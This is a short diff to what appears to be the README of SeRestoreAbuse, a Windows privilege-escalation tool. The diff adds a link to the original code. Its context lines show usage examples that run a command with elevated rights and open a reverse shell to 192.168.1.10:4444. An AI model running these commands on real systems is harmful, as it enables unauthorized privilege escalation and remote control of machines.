@@ -13,3 +13,6 @@ Examples:
   SeRestoreAbuse.exe "cmd /c whoami > C:\test.txt"
   SeRestoreAbuse.exe -revshell 192.168.1.10:4444
  ```
+
+# Original Code
+https://github.com/xct/SeRestoreAbuse
